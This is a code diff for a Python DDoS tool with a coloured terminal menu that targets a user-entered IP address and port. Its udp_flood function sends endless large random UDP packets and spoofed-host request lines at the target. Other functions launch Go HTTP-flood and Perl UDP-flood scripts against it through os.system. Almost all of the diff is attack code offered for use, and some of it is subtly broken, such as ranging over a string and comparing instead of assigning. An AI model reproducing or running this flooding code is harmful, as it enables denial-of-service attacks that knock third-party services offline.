@@ -47,92 +47,29 @@ NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
 Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
 IP_NOTFOUND='\n\u001b[1m[\u001b[31mNOT FOUND IP!\u001b[0m\u001b[1m]\u001b[0m'
 
-class ddos_udp:
+def mode():
+    print(f'''
+   \u001b[1m[\u001b[32;1m1\u001b[0m\u001b[1m]\u001b[0m UDP FLOOD ........... {SUCES_SYM}
+   \u001b[1m[\u001b[32;1m2\u001b[0m\u001b[1m]\u001b[0m HTTP FLOOD .......... {SUCES_SYM}
+   \u001b[1m[\u001b[32;1m3\u001b[0m\u001b[1m]\u001b[0m UDP FLOOD(perl) ..... {SUCES_SYM}\n''')
+    while True:
+        choice = input(promt_choice)
+        if choice == '1':
+            clear()
+            print(f'{PULS} Attacking {ip_target}')
+            udp_flood(ip_target, port_target)
+        elif choice == '2':
+            http_flood(ip_target, threads)
+        elif choice == '3':
+            udp_flood_perl(ip_target, port_target, threads)
+class start_min:
     def __init__(self):
 
         clear()
         banner_drgn()
-        try:
+        self.main_launc()
 
-            port = int(0)
-            times = int(0)
-            bands = int(0)
-            delays = int(0)
-            size = int(0)
-
-            print(f'\u001b[1m[\u001b[32;1m01\u001b[0m\u001b[1m]\u001b[0m Python ..... {SUCES_SYM}',
-                f'\n\u001b[1m[\u001b[32;1m02\u001b[0m\u001b[1m]\u001b[0m Perl ....... {ERROR_SYM}')
-            try:
-                x = input(promt_choice)
-                if x == '1':
-                    self.udp_floo()
-                if x == '2':
-                    self.udp_floo()
-                    clear()
-                    banner_drgn()
-                    IP_TARG = input(f'{PULS} Target: ')
-                    PORT_TARG = int(input(f'{PULS} Port: '))
-                    TIMES     = input(f'{PULS} Time: ')
-                    BAND_WIT  = input(f'{PULS} BandWidth: ')
-                    SIZE      = input(f'{PULS} Size: ')
-                    DELAYS    = input(f'{PULS} Delay: ')
-                    port = PORT_TARG
-                    times = TIMES
-                    bands = BAND_WIT
-                    delays = DELAYS
-                    size = SIZE
-                    if PORT_TARG == '':
-                        try:
-
-                            if 'https' in PORT_TARG:
-                                port = int(443)
-                            else:
-                                port = int(80)
-
-                        except:
-                            pass
-                    elif TIMES == '':
-                        try:
-                            times = int(120)
-                        except:
-                            pass
-                    elif BAND_WIT == '':
-                        try:
-                            bands = int(2000)
-                        except:
-                            pass
-                    elif DELAYS == '':
-                        try:
-                            delays = int(5)
-                        except:
-                            pass
-                    elif SIZE == '':
-                        try:
-                            size = int(60)
-                        except:
-                            pass
-                    else:
-                        try:
-                            sys.exit(NFound)
-                        except:
-                            pass
-
-                    """
-                    ht = "{} --port {} --time {} --bandwidth {} --delay {} --size{}".format(str(IP_TARG), int(port), int(times), int(bands), int(delays), int(size))
-                    test_open(str(IP_TARG), int(port), int(times), int(bands), int(delays), int(size))
-                    var = ''
-                    pipe = subprocess.Popen(["perl", "./udpflood.pl ", var], stdin=subprocess.PIPE)
-                    pipe.stdin.write(var)
-                    pipe.stdin.close()
-                    """
-
-            except (KeyboardInterrupt, ValueError):
-                sys.exit(Aborted)
-
-        except KeyboardInterrupt:
-            sys.exit(Aborted)
-
-    def udp_floo(self):
+    def main_launc(self):
 
             clear()
             banner_drgn()
@@ -140,6 +77,7 @@ class ddos_udp:
                 self.target()
                 self.port()
                 self.thread()
+                mode()
                 self.start()
             except KeyboardInterrupt:
                 sys.exit(Aborted)
@@ -211,75 +149,88 @@ class ddos_udp:
             thread_c = int(input(f'{PULS} Thread[2000]: '))
             if thread_c == '':
                 threads = 2000
-                self.start()
             else:
                 threads += thread_c
-                self.start()
         except ValueError:
             threads = 2000
 
     def start(self):
 
-        global ip_target, port_target, threads
         clear()
-        print(f'''
-    {PULS} IP TARGET   : {str(ip_target)}
-    {PULS} PORT TARGET : {int(port_target)}
-    {PULS} THREADS     : {int(threads)}''')
         ready = input(f'\n\n  {PULS} ENTER TO LAUNCH.')
-        if ready == '':
-            self.udp_flood(ip_target, port_target)
-        else:
-            self.udp_flood(ip_target, port_target)
 
-    def udp_flood(self, target, port):
-        global total_attack, multi
-        bytes  = random._urandom(50000)
-        t_g    = (str(target), int(port))
-        while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def udp_flood(target, port):
+    bytes  = random._urandom(50000)
+    t_g    = (str(target), int(port))
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            total_attack += 1
+            s.sendto(bytes,t_g)
+            s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
+            sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
+            sys.stdout.flush()
             try:
-                total_attack += 1
-                s.sendto(bytes,t_g)
-                s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
-                sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
-                sys.stdout.flush()
-                try:
-                    for i in range(str(multi)):
-                        s.sendto(bytes,t_g)
-                        total_attack += 1
-                        s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
-                        sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
-                        sys.stdout.flush()
-                except:
-                    try:
-                        s.close()
-                    except:
-                        pass
-
+                for i in range(str(multi)):
+                    s.sendto(bytes,t_g)
+                    total_attack += 1
+                    s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
+                    sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
+                    sys.stdout.flush()
             except:
                 try:
                     s.close()
                 except:
                     pass
+        except:
+            try:
+                s.close()
+            except:
+               pass
+
+def http_flood(target, threads):
+    try:
+        sec=input(f'{PULS} Second: ')
+        print('[1] Get\n[2] Post')
+        met=input(promt_choice)
+        if met == '1':
+            met = 'get'
+        elif met == '2':
+            met = 'post'
+        elif sec == '':
+            sec = 60
+        os.system(f'go run tools/net/DDOS/http_flood.go {target} {threads} {met} {sec} tools/net/DDOS/header.txt')
+    except KeyboardInterrupt:
+        sys.exit(Aborted)
+    except ValueError:
+        sys.exit(NFound)
+
+def udp_flood_perl(target, port, threads):
+
+    try:
+        band=input(f'{PULS} Bandwidth: ')
+        time=input(f'{PULS} Seconds: ')
+        delay=input(f'{PULS} Delay: ')
+        if band == '':
+            band=60
+        elif time == '':
+            time==120
+        elif delay=='':
+            delay=5
+        clear()
+        os.system(f'perl tools/net/udpflood.pl {target} --port {port} --size {threads} --bandwidth {band} --time {time} --delay {delay}')
+        sys.exit()
+    except KeyboardInterrupt:
+        sys.exit(Aborted)
+    except ValueError:
+        sys.exit(NFound)
 
 def tools_list():
+
     clear()
     banner_drgn()
-    print(f'''
-   \u001b[1m[\u001b[32;1m01\u001b[0m\u001b[1m]\u001b[0m UDP FLOOD ........... {SUCES_SYM}
-   \u001b[1m[\u001b[32;1m02\u001b[0m\u001b[1m]\u001b[0m SYN FLOOD ........... {ERROR_SYM}
-   \u001b[1m[\u001b[32;1m03\u001b[0m\u001b[1m]\u001b[0m TCP FLOOD ........... {ERROR_SYM}
-   \u001b[1m[\u001b[32;1m04\u001b[0m\u001b[1m]\u001b[0m CloudFlare Bypass ... {ERROR_SYM}
-   \u001b[1m[\u001b[32;1m05\u001b[0m\u001b[1m]\u001b[0m HTTP FLOOD .......... {ERROR_SYM}\n''')
     try:
-        x = input(promt_choice)
-        if len(x) == 3:
-            sys.exit(NFound)
-        elif (x == '1') or (x == '01'):
-            ddos_udp()
-        else:
-            sys.exit(NFound)
+        start_min()
     except ValueError:
         sys.exit(NFound)
 
